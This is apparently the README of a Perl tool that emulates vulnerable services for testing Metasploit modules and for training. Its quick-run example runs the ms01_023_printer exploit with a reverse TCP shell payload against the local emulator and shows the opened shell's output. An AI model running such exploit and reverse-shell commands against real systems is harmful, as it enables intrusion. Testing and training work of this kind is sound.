# vulnerabilityEmulator

The tool emulates vulnerable services for the purpose of 1) testing Metasploit modules.  2) help with training on Metasploit. 

Currently it runs on Linux platform (preferably on Ubuntu)

* Need to make it easy to install, require least dependencies.
* Emulation is mainly done in JSON, making it language independent.

# Quick run
On vulnerability Emulator:
```
perl vulEmu.pl
>>set 80 ms01_023_printer

```
on Metasploit console:
```
msf > use exploit/windows/iis/ms01_023_printer
msf > set payload windows/shell_reverse_tcp
msf > setg RHOST 127.0.0.1
msf > setg LHOST 127.0.0.1
msf exploit(ms01_023_printer) > run

[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:51852) at 2017-01-20 10:47:12 -0600

>>ls
README.md
secret.txt
server_cert.pem
server_key.pem
service.cfg
vulEmu.pl

```

